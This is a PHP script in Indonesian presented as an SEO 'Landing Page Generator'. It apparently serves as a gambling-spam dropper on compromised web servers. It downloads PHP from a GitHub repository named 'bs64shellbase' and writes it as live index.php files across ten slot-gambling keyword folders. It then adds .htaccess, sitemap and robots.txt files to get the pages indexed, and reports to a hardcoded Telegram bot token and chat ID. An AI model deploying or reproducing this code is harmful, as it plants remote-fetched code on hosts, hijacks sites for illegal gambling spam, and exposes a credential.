<?php
$keywords = [
    'ok88', 'ok88-gacor', 'ok88-slotgacor', 'ok88-gambler', 'ok88-online-kasino',
    'slot-gacor-hari-ini', 'link-slot-gacor-terpercaya', 'slot-bonus-new-member',
    'rtp-slot-tertinggi', 'slot-gacor-pragmatic'
];

$telegramToken = '8481177639:AAGRYKPlQxr1PXcMqHgBTQo3MmmSkv_iI7w';
$chatId = '1883446251';
$templateUrl = 'https://raw.githubusercontent.com/Cnull00/bs64shellbase/refs/heads/main/lp3.php';

function sendTelegram($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];
    @file_get_contents($url . '?' . http_build_query($data));
}

function is_url_ok($url) {
    sleep(1);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_NOBODY => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($httpcode == 200);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ob_implicit_flush(true);
    ob_end_flush();
    echo str_repeat(" ", 1024);
    echo "<div id='status' style='text-align:left;padding:10px;margin:10px auto;max-width:700px;background:#111;color:#0f0;font-family:monospace;'></div>";
    
    $title = htmlspecialchars($_POST['title']);
    $baseDir = 'home';
    
    // Buat folder utama jika belum ada
    if (!file_exists($baseDir)) mkdir($baseDir, 0777, true);
    
    // Ambil template dari GitHub
    $templateContent = @file_get_contents($templateUrl);
    if (!$templateContent) {
        die('<script>document.getElementById("status").innerHTML = "❌ Gagal mengambil template dari GitHub!";</script>');
    }
    
    // Replace variabel dalam template
    $replacedTemplate = str_replace(
        ['{site title index}', '{TITLE SITE}', '{isi url landingpage}'],
        [$title, $title, "https://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/$baseDir/"],
        $templateContent
    );
    
    // Konfigurasi .htaccess
    $htaccessContent = <<<HT
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

<FilesMatch "^(index\\.php)\$">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<FilesMatch "^(?!index\\.php\$).*$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css application/javascript application/json
</IfModule>

<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/png "access plus 1 month"
</IfModule>

<IfModule mod_headers.c>
    Header set X-Robots-Tag "index, follow"
</IfModule>
HT;

    $validUrls = [];
    
    // Buat landing page utama
    file_put_contents("$baseDir/index.php", $replacedTemplate);
    file_put_contents("$baseDir/.htaccess", $htaccessContent);
    
    $mainUrl = "https://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/$baseDir/";
    echo "<script>document.getElementById('status').innerHTML += 'Membuat landing page utama...<br>';</script>";
    flush();
    
    // Buat folder untuk setiap keyword
    foreach ($keywords as $slug) {
        $targetFolder = "$baseDir/$slug";
        if (!file_exists($targetFolder)) mkdir($targetFolder, 0777, true);
        
        // Buat file index.php di dalam folder keyword
        file_put_contents("$targetFolder/index.php", $replacedTemplate);
        file_put_contents("$targetFolder/.htaccess", $htaccessContent);
        
        $url = $mainUrl . "$slug/";
        echo "<script>document.getElementById('status').innerHTML += 'Mengecek: $url ...<br>';</script>";
        flush();
        
        if (is_url_ok($url)) {
            $validUrls[] = $url;
            echo "<script>document.getElementById('status').innerHTML += '✔ Aktif: $url<br>';</script>";
        } else {
            echo "<script>document.getElementById('status').innerHTML += '✖ Tidak aktif: $url<br>';</script>";
        }
        flush();
    }
    
    // Buat sitemap.xml
    $sitemap = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
    $sitemap .= "<url>\n<loc>$mainUrl</loc>\n<lastmod>".date('Y-m-d')."</lastmod>\n<changefreq>daily</changefreq>\n<priority>1.0</priority>\n</url>\n";
    
    foreach ($validUrls as $url) {
        $sitemap .= "<url>\n<loc>$url</loc>\n<lastmod>".date('Y-m-d')."</lastmod>\n<changefreq>daily</changefreq>\n<priority>0.8</priority>\n</url>\n";
    }
    $sitemap .= "</urlset>";
    file_put_contents("$baseDir/sitemap.xml", $sitemap);
    
    // Buat robots.txt
    $robotsTxt = "User-agent: *\nAllow: /\nSitemap: $mainUrl"."sitemap.xml";
    file_put_contents("$baseDir/robots.txt", $robotsTxt);
    
    // Kirim notifikasi ke Telegram
    $count = count($validUrls) + 1; // +1 untuk halaman utama
    $message = "✅ Landing page selesai dibuat!\nTotal URL aktif: $count\nSitemap: $mainUrl"."sitemap.xml";
    sendTelegram($telegramToken, $chatId, $message);
    
    echo "<script>
        document.getElementById('loading').style.display = 'none';
        alert('Generator berhasil! Total $count halaman aktif.');
        window.location = 'index.php';
    </script>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Landing Page Generator</title>
  <style>
    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        color: #e6e6e6;
        text-align: center;
        padding: 0;
        margin: 0;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .container {
        background: rgba(25, 25, 35, 0.8);
        backdrop-filter: blur(10px);
        padding: 40px;
        border-radius: 15px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        width: 90%;
        max-width: 500px;
        border: 1px solid rgba(0, 255, 150, 0.3);
    }
    h1 {
        color: #00ff96;
        font-size: 2.5rem;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(0, 255, 150, 0.5);
    }
    .subtitle {
        color: #8c8c8c;
        margin-bottom: 30px;
        font-size: 1.1rem;
    }
    .input-group {
        margin-bottom: 25px;
        text-align: left;
    }
    label {
        display: block;
        margin-bottom: 8px;
        color: #00ff96;
        font-weight: 500;
    }
    input[type="text"] {
        width: 100%;
        padding: 14px;
        border-radius: 8px;
        border: 2px solid #2c2c54;
        background: rgba(30, 30, 46, 0.7);
        color: #fff;
        font-size: 1rem;
        transition: all 0.3s;
    }
    input[type="text"]:focus {
        border-color: #00ff96;
        outline: none;
        box-shadow: 0 0 10px rgba(0, 255, 150, 0.3);
    }
    button {
        background: linear-gradient(135deg, #00b894 0%, #00ff96 100%);
        color: #000;
        border: none;
        padding: 16px;
        font-size: 1.1rem;
        font-weight: bold;
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.3s;
        width: 100%;
        box-shadow: 0 4px 15px rgba(0, 255, 150, 0.3);
    }
    button:hover {
        transform: translateY(-3px);
        box-shadow: 0 7px 20px rgba(0, 255, 150, 0.4);
    }
    button:active {
        transform: translateY(1px);
    }
    #loading {
        display: none;
        color: #00ff96;
        margin-top: 25px;
        font-size: 1.1rem;
        font-weight: 500;
    }
    .features {
        margin-top: 30px;
        text-align: left;
    }
    .features h3 {
        color: #00ff96;
        border-bottom: 1px solid #2c2c54;
        padding-bottom: 10px;
        margin-bottom: 15px;
    }
    .features ul {
        padding-left: 20px;
    }
    .features li {
        margin-bottom: 10px;
        color: #8c8c8c;
        position: relative;
    }
    .features li:before {
        content: "✓";
        color: #00ff96;
        position: absolute;
        left: -20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Landing Page Generator</h1>
    <p class="subtitle">Buat landing page SEO dalam hitungan detik</p>
    
    <form method="POST" onsubmit="showLoading()">
      <div class="input-group">
        <label for="title">Judul Website</label>
        <input type="text" name="title" id="title" required placeholder="Masukkan judul website">
      </div>
      
      <button type="submit">
        <span id="button-text">Buat Landing Page</span>
      </button>
      <div id="loading">⏳ Membuat landing page, sitemap, dan robots.txt...</div>
    </form>
    
    <div class="features">
      <h3>Fitur Utama:</h3>
      <ul>
        <li>Template landing page dari GitHub</li>
        <li>10 halaman keyword otomatis</li>
        <li>Sitemap.xml & robots.txt otomatis</li>
        <li>Verifikasi URL real-time</li>
        <li>Notifikasi Telegram saat selesai</li>
        <li>Konfigurasi SEO optimal</li>
      </ul>
    </div>
  </div>

  <script>
    function showLoading() {
      const button = document.querySelector('button');
      const buttonText = document.getElementById('button-text');
      const loading = document.getElementById('loading');
      
      button.disabled = true;
      button.style.opacity = '0.7';
      buttonText.textContent = 'Memproses...';
      loading.style.display = 'block';
    }
  </script>
</body>
</html>
